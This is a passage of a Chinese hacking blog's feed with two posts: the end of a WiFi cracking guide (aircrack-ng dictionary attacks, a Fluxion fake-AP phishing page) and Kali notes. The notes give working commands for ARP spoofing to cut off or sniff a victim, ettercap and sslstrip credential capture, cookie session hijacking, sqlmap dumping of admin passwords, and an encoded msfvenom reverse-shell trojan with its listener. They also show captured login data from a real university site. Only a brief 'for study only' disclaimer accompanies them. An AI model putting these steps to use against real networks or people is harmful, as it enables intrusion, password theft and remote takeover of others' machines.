src="http://pjq6e477y.bkt.clouddn.com/9.jpg" width="400"></p><p>我们破解时主要用到的是<code>.cap</code>文件，破解命令如下：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w <span class="string">[字典文件]</span> <span class="string">[.cap文件]</span></span><br></pre></td></tr></table></figure></p><p>Kali自带的字典文件目录有以下几个（比较小）：<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/john/</span></span><br><span class="line"><span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/wfuzz/</span>wordlist/</span><br><span class="line"><span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/wordlists/</span></span><br></pre></td></tr></table></figure></p><blockquote><p>解释：暴力破解，顾名思义就是我们需要准备一个尽量详尽且可能较大的字典文件，该文件中也许包含了小至以M为单位的秘钥文件，大至以G为单位的秘钥文件，然后使用<code>aircrack-ng</code>一个个去暴力破解，待其找到正确秘钥之后就会自动终止程序。通过如上解释，所以说如果我们的字典足够完整，也许在你睡一觉之后即可破解，此时的你需要对收获与时间成本进行考量，，还有一种情况就是几天下来直至字典跑完也没有成功破解wifi，原因就是使用的字典中未含有正确秘钥。</p><p>补充：1. 可通过彩虹表的方法来增大跑字典的效率。2. 可以使用GPU来增大跑字典的效率。3. 可使用kali内置的crunch工具自动生成字典。<br>以上补充有兴趣的可以去了解，这里就不详细说明了，有时间的话也许会在后面的文章单独成文。</p></blockquote><p>常用命令：<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep [Password] [字典] <span class="comment"># 查看字典中是否含有目标秘钥</span></span><br><span class="line">cat [字典] | wc -l <span class="comment"># 查看字典文件有多少行数据</span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">/usr/share/wordlists</span> &amp;&amp; gunzip rockyou.txt.gz <span class="comment"># 解压Kali自带rockyou.txt.gz文件</span></span><br></pre></td></tr></table></figure></p><p>使用<code>aircrack-ng</code>之后，如果破解成功将显示如下内容：<br><img src="http://pjq6e477y.bkt.clouddn.com/10.jpg" width="400"></p><h3 id="Fluxion社会工程学破解"><a href="#Fluxion社会工程学破解" class="headerlink" title="Fluxion社会工程学破解"></a>Fluxion社会工程学破解</h3><p>以上是Kali暴力破解的内容，但往往我们使用暴力破解的结果不尽如人意，此时我们可以考虑Fluxion社会工程学来进行破解。社会工程学是很高深的一门学问，为了吊大家的胃口这里就简单的说下：好像是外国一名黑客入侵攻击之后被抓坐牢，然后出了一本书。强烈推荐大家去了解下，很有意思的 (￣_,￣ )，像许多电影亦或是电视剧都有相关内容的出现，比如《Who am i，没有绝对的安全系统》、《黑客军团》，为了让该推荐在该文章中更加的醒目些，以下博主推荐的连接内容务必前去看看，相当有意思的，不感兴趣的话那就算了(ノへ￣、)：</p><font color="red" size="15">https://baike.baidu.com/item/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/2136830?fr=aladdinhttps://baike.baidu.com/item/%E6%AC%BA%E9%AA%97%E7%9A%84%E8%89%BA%E6%9C%AF/10253577</font><p>好了，社会工程学介绍完了，我们来讲讲Flusion的使用吧（前面已经安装过了，忘了的可往回翻一翻）。<br><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=174774335,59681927&fm=26&gp=0.jpg" width="300"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/root/</span>   <span class="comment"># 进入root目录（根据自己的Fluxion安装路径）</span></span><br><span class="line"><span class="keyword">ls</span>  <span class="comment"># 列出当前所有文件，查看是否含有fluxion</span></span><br><span class="line"><span class="keyword">cd</span> fluxion  <span class="comment"># 进入fluxion</span></span><br><span class="line"><span class="keyword">ls</span>  <span class="comment"># 查看该项目内的文件，具体文件介绍可自行查找资料，这里接不说了</span></span><br><span class="line"><span class="string">./fluxion.sh</span>    <span class="comment"># 启动fluxion</span></span><br></pre></td></tr></table></figure><p>启动之后，你或许会看见如下内容：<br><img src="http://pjq6e477y.bkt.clouddn.com/12.jpg" width="400"></p><p>内容显示你当前kali中并没有安装相关插件，我们可通过如下进行安装：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> install XXXXXX  # XXXXXX表示的是未安装的插件，比如apt-<span class="builtin-name">get</span> install bc，将所有的插件安装一遍即可</span><br></pre></td></tr></table></figure></p><p>安装之后我们再次执行fluxion:<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/root/fluxion</span> &amp;&amp; <span class="string">./fluxion.sh</span></span><br></pre></td></tr></table></figure></p><p>初次接触fluxion的朋友可能不知道怎么操作，但具体操作也没有那什么难度，所以这里就贴图简单的解释一下。</p><ul><li>选择语言<br><img src="http://pjq6e477y.bkt.clouddn.com/13.jpg" width="400"></li></ul><p>从上图我们可以看到有11个选项，每个选项对应一种语言操作，这里我们直接选择<code>6：chinese</code></p><ul><li>选择网卡<br><img src="http://pjq6e477y.bkt.clouddn.com/14.jpg" width="400"></li></ul><p>此处是网卡的选择，当你插上USB无线网卡并成功连接之后，虚拟机会自动监听，所以直接默认即可</p><ul><li>选择信道并开始监听<br><img src="http://pjq6e477y.bkt.clouddn.com/15.jpg" width="400"><br><img src="http://pjq6e477y.bkt.clouddn.com/16.jpg" width="400"></li></ul><p>这里我们选择所有信道，选择之后将会出现类似之前跑字典的信道界面，当看见你想要破解的wifi之后我们需要执行<code>ctrl+c</code>退出即可</p><ul><li>选择目标<br><img src="http://pjq6e477y.bkt.clouddn.com/17.jpg" width="400"></li></ul><p>选择目标wifi代号</p><ul><li>创建AP<br><img src="http://pjq6e477y.bkt.clouddn.com/18.jpg" width="400"></li></ul><p>因为这里我们使用的是社会工程学来进行欺骗，所以我们需要创建一个伪装AP来供目标连接，直接选择1即可</p><p>——————————————————————————————分割线——————————————————————————————</p><p>后面的内容就是真正的拦截过程，由于现在室友正在使用wifi，这里就暂时写到这了，以后有机会再来补充。简单的介绍一下吧：</p><p>首先执行生成一个<code>web</code>站点，该站点为钓鱼网站，主要用于目标登录其Wifi。我们执行命令之后，目标路由器或者交换机上所连接的设备将会自动断开，此后将会自动生成一个我们伪装的AP，待目标设备连接上该AP之后将会自动跳转到钓鱼站点，待其输入密码后我们既能在Kali终端下得到目标wifi的密码，得到密码之后程序将会自动终止，目标wifi也将恢复正常。</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是本文所有wifi的破解方法了，如果日后接触到了其他其他方法再在本文进行更新。最后，在这里再提醒一下：</p><p><font color="red">任何具有一定侵略性的网络攻击行为都属于非法操作。本文中所有的内容是在自家寝室进行，所攻击的wifi也是自家寝室内的，该文只供学习，切勿用于非法操作，一切后果由使用者本人负责。</font></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1544806153437&di=fe3bcd2093a5fc81f192d946c618a173&imgtype=0&src=http%3A%2F%2Fwx4.sinaimg.cn%2Fbmiddle%2Fedadc0ebgy1fpn86qcibkj20hs0jkq69.jpg" width="300"></h2><div style="text-align: right">2018-10-12,By Zero</div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;免责申明&quot;&gt;&lt;a href=&quot;#免责申明&quot; class=&quot;headerlink&quot; title=&quot;免责申明&quot;&gt;&lt;/a&gt;免责申明&lt;/h2&gt;&lt;p&gt;正如&lt;a href=&quot;https://book.douban.com/subject/10433737/&quot; target=&quot;
      
    
    </summary>
    
      <category term="白帽子" scheme="muzimz.cn/categories/%E7%99%BD%E5%B8%BD%E5%AD%90/"/>
    
    
      <category term="Kali" scheme="muzimz.cn/tags/Kali/"/>
    
      <category term="Fluxion" scheme="muzimz.cn/tags/Fluxion/"/>
    
      <category term="wifi" scheme="muzimz.cn/tags/wifi/"/>
    
      <category term="airmon-ng" scheme="muzimz.cn/tags/airmon-ng/"/>
    
  </entry>
  
  <entry>
    <title>Kali基本操作</title>
    <link href="muzimz.cn/2018/09/28/Kali/"/>
    <id>muzimz.cn/2018/09/28/Kali/</id>
    <published>2018-09-28T05:54:02.000Z</published>
    <updated>2019-02-02T16:36:08.405Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以下内容为博主学习《Kali Linux渗透测试的艺术》一书所记录的笔记，有点凌乱、还未整理，有时间再来弄。</p></blockquote><h2 id="一、换源并安装open-vm-tools"><a href="#一、换源并安装open-vm-tools" class="headerlink" title="一、换源并安装open-vm-tools"></a>一、换源并安装open-vm-tools</h2><h3 id="1-1-打开sources-list文件"><a href="#1-1-打开sources-list文件" class="headerlink" title="1.1 打开sources.list文件"></a>1.1 打开sources.list文件</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad /etc/apt/sources.<span class="built_in">list</span></span><br></pre></td></tr></table></figure><h3 id="1-2-在文件中添加如下内容"><a href="#1-2-在文件中添加如下内容" class="headerlink" title="1.2 在文件中添加如下内容"></a>1.2 在文件中添加如下内容</h3><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deb <span class="string">http:</span><span class="comment">//mirrors.edu.cn/kali sana main non-free contrib</span></span><br><span class="line">deb <span class="string">http:</span><span class="comment">//mirrors.edu.cn/kali-security/sana/updates main contrib non-free</span></span><br><span class="line">deb-src <span class="string">http:</span><span class="comment">//mirrors.ustc.edu.cn/kali-security/sana/updates main contrib non-free</span></span><br><span class="line">deb <span class="string">http:</span><span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free</span></span><br></pre></td></tr></table></figure><h3 id="1-3-更新并安装"><a href="#1-3-更新并安装" class="headerlink" title="1.3 更新并安装"></a>1.3 更新并安装</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> <span class="keyword">update</span></span><br><span class="line">apt-<span class="built_in">get</span> install <span class="keyword">open</span>-<span class="keyword">vm</span>-tools-desktop fuse</span><br></pre></td></tr></table></figure><h2 id="二、安装中文输入"><a href="#二、安装中文输入" class="headerlink" title="二、安装中文输入"></a>二、安装中文输入</h2><h3 id="2-1-下载搜狗"><a href="#2-1-下载搜狗" class="headerlink" title="2.1 下载搜狗"></a>2.1 下载搜狗</h3><p>在pinyin.sogou.com/linux中下载搜狗</p><h3 id="2-2-安装"><a href="#2-2-安装" class="headerlink" title="2.2 安装"></a>2.2 安装</h3><p>终端进入上方文件路径，执行如下：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解决依赖：apt-<span class="builtin-name">get</span> install -f</span><br><span class="line">安装：dpkg -i 包名</span><br></pre></td></tr></table></figure></p><h2 id="三、美化kali"><a href="#三、美化kali" class="headerlink" title="三、美化kali"></a>三、美化kali</h2><p>图标位置：/usr/share/icons/<br>主题位置：/usr/share/themes/</p><h3 id="四、局域网断网攻击"><a href="#四、局域网断网攻击" class="headerlink" title="四、局域网断网攻击"></a>四、局域网断网攻击</h3><h3 id="4-1-欺骗"><a href="#4-1-欺骗" class="headerlink" title="4.1 欺骗"></a>4.1 欺骗</h3><p>欺骗命令如下：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -<span class="selector-tag">i</span> 网卡 -t 被骗目标ip 网关</span><br></pre></td></tr></table></figure></p><p>欺骗命令执行之前需要桥接自己的kali网络，其桥接过程如下：</p><ol><li>右键kali系统，点开设置</li><li>将网络适配器设置成桥接模式</li><li>一次点开：编辑 -&gt; 虚拟网络编辑器 -&gt; vmnet0 -&gt; 确定</li></ol><p>参数解读：</p><ol><li>网卡：网卡是kali的网卡名，可以使用ifconfig查看（可见eth0）</li><li>被骗目标ip：受害者的ip，windows用户可以使用ipconfig查看</li><li>网关：网关是一个中间载体，同样可以使用ipconfig查看（默认网关）</li></ol><p>ip查询：我们在对受害者进行arp欺骗的时候，往往是不知道对方的ip的，但是我么可以使用如下命令偷偷的查询对方ip：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -asg <span class="number">192.168</span><span class="number">.31</span><span class="number">.0</span>/<span class="number">24</span> <span class="comment">//网关最后是0+24</span></span><br></pre></td></tr></table></figure></p><h3 id="4-2-攻击"><a href="#4-2-攻击" class="headerlink" title="4.2 攻击"></a>4.2 攻击</h3><h4 id="4-2-1-瘫痪对方的电脑"><a href="#4-2-1-瘫痪对方的电脑" class="headerlink" title="4.2.1 瘫痪对方的电脑"></a>4.2.1 瘫痪对方的电脑</h4><p>执行上述命令，即可让对方的网络瘫痪：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -<span class="selector-tag">i</span> 网卡 -t 被骗目标ip 网关</span><br></pre></td></tr></table></figure><p>执行之后，对方就无法正常使用网络了（比如访问网页、qq聊天等等一切网络活动），ctrl+z之后取消瘫痪操作</p><h4 id="4-2-2-劫持对方的请求（账号，密码之类的）"><a href="#4-2-2-劫持对方的请求（账号，密码之类的）" class="headerlink" title="4.2.2 劫持对方的请求（账号，密码之类的）"></a>4.2.2 劫持对方的请求（账号，密码之类的）</h4><p>这里的劫持与上后面的瘫痪有点不同，劫持的话不能让对方网络瘫痪，所以我们在劫持之前需要进行如下命令操作（ip流量转发）：<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /proc/sys/net/ipv4/  # 进入该目录</span><br><span class="line">cat ip_forward  # 查看属性值，会发现输出<span class="number">0</span>（默认是<span class="number">0</span>，我们需要更改为<span class="number">1</span>）</span><br><span class="line">echo <span class="number">1</span> &gt; ip_forward```# 将ip_forward值改为<span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>如上操作之后我们继续执行arpspoof欺骗：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -<span class="selector-tag">i</span> 网卡 -t 被骗目标ip 网关</span><br></pre></td></tr></table></figure></p><p>在欺骗之后，我们执行如下命令来进行嗅探：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tq -<span class="selector-tag">i</span> eth0</span><br></pre></td></tr></table></figure></p><p>执行之后发现，虽然这次对方可以正常使用网络，但是他的电脑已经在我们的监控中了，比如目标登录自己的某个站点，则在kali的终端上会输出对方的账号及密码</p><h4 id="4-2-4-嗅探对方的浏览图片"><a href="#4-2-4-嗅探对方的浏览图片" class="headerlink" title="4.2.4 嗅探对方的浏览图片"></a>4.2.4 嗅探对方的浏览图片</h4><p>在进行上述的ip流量转发之后，我们可以使用如下命令来截取对方浏览页面的图片：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -<span class="selector-tag">i</span> eth0</span><br></pre></td></tr></table></figure></p><p>执行之后，会出现一个窗口    ，该窗口用于显示对方浏览页面的图片，并会将图片保存至kali本地</p><h2 id="五、https账号、密码获取"><a href="#五、https账号、密码获取" class="headerlink" title="五、https账号、密码获取"></a>五、https账号、密码获取</h2><h3 id="5-1-准备工作"><a href="#5-1-准备工作" class="headerlink" title="5.1 准备工作"></a>5.1 准备工作</h3><h4 id="5-1-1-Vim：文本编辑器"><a href="#5-1-1-Vim：文本编辑器" class="headerlink" title="5.1.1 Vim：文本编辑器"></a>5.1.1 Vim：文本编辑器</h4><p>进入文件进行编辑：vim 123.txt （不存在会自动创建）<br>退出文件编辑：</p><ol><li>按ESC </li><li>shift+： </li><li><ol><li>输入q！   # 不保存退出</li></ol></li></ol><p>打开 etterc.conf文件<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>ettercap<span class="regexp">/ettc.conf/</span></span><br></pre></td></tr></table></figure></p><p>移动光标，把linux设置一下，将redir前的注释符删掉<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">if</span> you use iptables:</span><br><span class="line">   #redir_command_on = <span class="string">"iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"</span></span><br><span class="line">   #redir_command_off = <span class="string">"iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"</span></span><br></pre></td></tr></table></figure></p><p>刚开始是不能编辑的，编辑操作如下</p><ul><li><p>vim编辑：按一下 i 就可以对文件进行编辑了，在上述所述的位置将两个#去掉</p></li><li><p>vim保存：按一下ESC键，再按shift+:键，继续如下：</p></li></ul><ol><li>wq   保存并退出</li><li>q!   不保存并退出</li></ol><h4 id="5-1-2-开启ssh："><a href="#5-1-2-开启ssh：" class="headerlink" title="5.1.2 开启ssh："></a>5.1.2 开启ssh：</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/etc/i</span>nitd<span class="regexp">/ssh start</span></span><br></pre></td></tr></table></figure><h4 id="5-1-3-sslstrip工具"><a href="#5-1-3-sslstrip工具" class="headerlink" title="5.1.3 sslstrip工具"></a>5.1.3 sslstrip工具</h4><p>这个工具能够把https的链接还原为http。<br>执行命令：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -<span class="selector-tag">a</span> -f -k</span><br></pre></td></tr></table></figure></p><p>参数说明：</p><ol><li>-a</li><li>-f</li><li>-k</li></ol><h3 id="5-2-截取账号及密码"><a href="#5-2-截取账号及密码" class="headerlink" title="5.2 截取账号及密码"></a>5.2 截取账号及密码</h3><ul><li><p>执行欺骗操作</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">arpspoof</span> <span class="selector-tag">-i</span> <span class="selector-tag">eth0</span> <span class="selector-tag">-t</span> 192<span class="selector-class">.168</span><span class="selector-class">.31</span><span class="selector-class">.117</span> 192<span class="selector-class">.168</span><span class="selector-class">.31</span><span class="selector-class">.1</span></span><br></pre></td></tr></table></figure></li><li><p>执行sslstrip</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -<span class="selector-tag">a</span> -f -k</span><br></pre></td></tr></table></figure></li><li><p>执行ettercap</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tq -<span class="selector-tag">i</span> eth0</span><br></pre></td></tr></table></figure></li><li><p>当目标用户登录https登录的时候就可以在kali终端获取到他的账号以及密码，例子如下：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP : <span class="number">211.80</span><span class="number">.112</span><span class="number">.41</span>:<span class="number">80</span> -&gt; </span><br><span class="line"><span class="symbol">USER:</span> <span class="number">1620814</span>  </span><br><span class="line"><span class="symbol">PASS:</span> <span class="number">741948</span>a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a  </span><br><span class="line"><span class="symbol">INFO:</span> mids.gench.edu.cn/_customize/passLogin</span><br><span class="line"><span class="symbol">CONTENT:</span> loginTicket=<span class="number">425</span>d9c18<span class="number">-424</span>b<span class="number">-418</span>d-b027<span class="number">-2095e618</span>f829<span class="variable">&amp;username</span>=<span class="number">1620814</span><span class="variable">&amp;password</span>=<span class="number">741948</span>a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a</span><br></pre></td></tr></table></figure></li></ul><p>分析：</p><ol><li>HTTP：ip及端口</li><li>USER：用户名</li><li>PASS：登录密码，注意：这里的密码并不是明文的，他是经过加密的，至于如何解密这个密码，以后有时间再来介绍</li><li>CONTENT：参数的组合</li></ol><h2 id="六、回话劫持，登录目标站点"><a href="#六、回话劫持，登录目标站点" class="headerlink" title="六、回话劫持，登录目标站点"></a>六、回话劫持，登录目标站点</h2><h3 id="6-1-工具准备"><a href="#6-1-工具准备" class="headerlink" title="6.1 工具准备"></a>6.1 工具准备</h3><ol><li>arpspoof     欺骗</li><li>wireshark        抓包</li><li>ferret       重新生成抓包后的文件</li><li>hamster</li></ol><p>ferret安装，一次执行如下：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dpkg --add-architecture i386 &amp;&amp; apt-<span class="builtin-name">get</span> update &amp;&amp; apt-<span class="builtin-name">get</span> install ferret-sidejack:i386</span><br><span class="line">apt-<span class="builtin-name">get</span> clean &amp;&amp; apt-<span class="builtin-name">get</span> update &amp;&amp; apt-<span class="builtin-name">get</span><span class="built_in"> upgrade </span>-y &amp;&amp; apt-<span class="builtin-name">get</span> dist-upgrade -y</span><br><span class="line">apt install ferret -y</span><br></pre></td></tr></table></figure></p><h3 id="6-2-过程（方法一）"><a href="#6-2-过程（方法一）" class="headerlink" title="6.2 过程（方法一）"></a>6.2 过程（方法一）</h3><ul><li>arpspoof欺骗</li><li><p>启动wireshark</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wireshark</span></span><br></pre></td></tr></table></figure></li><li><p>点击eth0网卡，并让他持续运行下去</p></li><li>目标登录某个站点（上钩）</li><li>为了防止延迟，让wireshark再运行一段时间之后停掉wireshark</li><li>保存文件名为cookie至桌面，并格式为wireshark…….pacp</li><li><p>终端进入桌面，并执行如下命令（这个ferret有点问题，在这记录一下，以后再来看）：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ferret</span> <span class="selector-tag">-r</span> <span class="selector-tag">cookie</span><span class="selector-class">.pcap</span></span><br></pre></td></tr></table></figure></li><li><p>执行hamster，会看到要求我们把代理改成本地（127.0.0.1）的，然后端口为1234</p></li></ul><ol><li>代开kali内置的火狐浏览器</li><li>点击设置 -&gt; Advanced -&gt; Network -&gt; Settings -&gt; 勾选Manual……并将http proxy改为127.0.0.1：1234</li></ol><ul><li>在kali中访问127.0.0.1：1234</li><li>之后会发现有个欺骗的ip，点开后就会出现很多的链接，ctrl+f找到</li></ul><h3 id="6-3-过程（方法二）"><a href="#6-3-过程（方法二）" class="headerlink" title="6.3 过程（方法二）"></a>6.3 过程（方法二）</h3><ul><li>ferret -i eth0</li><li>以后在记录</li></ul><h2 id="七、SQLMAP注入，ASP、PHP网站渗透"><a href="#七、SQLMAP注入，ASP、PHP网站渗透" class="headerlink" title="七、SQLMAP注入，ASP、PHP网站渗透"></a>七、SQLMAP注入，ASP、PHP网站渗透</h2><h3 id="7-1-科普"><a href="#7-1-科普" class="headerlink" title="7.1 科普"></a>7.1 科普</h3><h4 id="7-1-1-ASP"><a href="#7-1-1-ASP" class="headerlink" title="7.1.1 ASP"></a>7.1.1 ASP</h4><p>ASP即Active Server Pages，是MicroSoft公司开发的服务器端脚本环境，可用来创建动态交互式网页并建立强大的web应用程序。当服务器收到对ASP文件的请求时，它会处理包含在用于构建发送给浏览器的HTML（Hyper Text Markup Language，超文本置标语言）网页文件中的服务器端脚本代码。除服务器端脚本代码外，ASP文件也可以包含文本、HTML（包括相关的客户端脚本）和com组件调用。 [1-2]<br>ASP简单、易于维护 ， 是小型页面应用程序的选择 ，在使用DCOM （Distributed Component Object Model）和 MTS（Microsoft Transaction Server）的情况下， ASP甚至可以实现中等规模的企业应用程序。 [3] </p><h4 id="7-1-2-PHP"><a href="#7-1-2-PHP" class="headerlink" title="7.1.2 PHP"></a>7.1.2 PHP</h4><p>PHP（外文名:PHP: Hypertext Preprocessor，中文名：“超文本预处理器”）是一种通用开源脚本语言。语法吸收了C语言、Java和Perl的特点，利于学习，使用广泛，主要适用于Web开发领域。PHP 独特的语法混合了C、Java、Perl以及PHP自创的语法。它可以比CGI或者Perl更快速地执行动态网页。用PHP做出的动态页面与其他的编程语言相比，PHP是将程序嵌入到HTML（标准通用标记语言下的一个应用）文档中去执行，执行效率比完全生成HTML标记的CGI要高许多；PHP还可以执行编译后代码，编译可以达到加密和优化代码运行，使代码运行更快。</p><h3 id="7-2-ASP渗透"><a href="#7-2-ASP渗透" class="headerlink" title="7.2 ASP渗透"></a>7.2 ASP渗透</h3><ul><li>监测是否存在注入<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -u 网站</span><br></pre></td></tr></table></figure></li></ul><p>如果该目标网站有注入，则会返回数据库的各种信息。</p><ul><li><p>拆解目标网站的数据库表</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 网站 <span class="comment">--tables</span></span><br></pre></td></tr></table></figure></li><li><p>根据User表拆解列名</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlamp -u 网站 --<span class="built_in">columns</span> -<span class="built_in">T</span> <span class="string">"user"</span></span><br></pre></td></tr></table></figure></li><li><p>username拆解出来后就不需要再进行拆解了</p></li><li>得到目标网站后台管理员的登录密码<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sqlmap </span>-u 目标网站 <span class="built_in">--dump</span> -C <span class="string">"username,password"</span> -T <span class="string">"user"</span></span><br></pre></td></tr></table></figure></li></ul><p>—dump：下载数据<br>-C “username,password” 列名</p><h3 id="7-3-PHP渗透"><a href="#7-3-PHP渗透" class="headerlink" title="7.3 PHP渗透"></a>7.3 PHP渗透</h3><p>待更新</p><h3 id="7-4-Cookie渗透"><a href="#7-4-Cookie渗透" class="headerlink" title="7.4 Cookie渗透"></a>7.4 Cookie渗透</h3><p>待更新</p><h2 id="八、Metasplooit"><a href="#八、Metasplooit" class="headerlink" title="八、Metasplooit"></a>八、Metasplooit</h2><h3 id="8-1-基本操作"><a href="#8-1-基本操作" class="headerlink" title="8.1 基本操作"></a>8.1 基本操作</h3><ul><li>启动：msfconsole</li><li>漏洞利用工具：exploit</li><li>漏洞执行后的demo：payloads</li></ul><h3 id="8-2-远程控制软件"><a href="#8-2-远程控制软件" class="headerlink" title="8.2 远程控制软件"></a>8.2 远程控制软件</h3><h4 id="8-2-1-实现过程"><a href="#8-2-1-实现过程" class="headerlink" title="8.2.1 实现过程"></a>8.2.1 实现过程</h4><ul><li><p>根据自己的ip设定一个木马（旧版使用msfpayload 不是 msfvenom -p），本操作是在桌面路径下执行</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 <span class="attribute">LHOST</span>=kali的ip <span class="attribute">LPORT</span>=55555 -f exe &gt; test.exe</span><br></pre></td></tr></table></figure></li><li><p>之后会生成一个test.exe木马程序，将文件拖至windows平台上</p></li><li><p>使用handler模块，本操作以及之后的操作是在msfconsole下执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/multi/<span class="keyword">handler</span></span><br></pre></td></tr></table></figure></li><li><p>用shellcode程序</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> PAYLOAD <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br></pre></td></tr></table></figure></li><li><p>查看</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">show options</span></span><br></pre></td></tr></table></figure></li><li><p>设置参数，比如设置ip和端口</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> LHOST 自己的<span class="comment">ip</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LPORT</span> 端口（<span class="comment">55555</span>）</span><br></pre></td></tr></table></figure></li><li><p>执行并等待目标上钩</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">exploit</span></span><br></pre></td></tr></table></figure></li></ul><h4 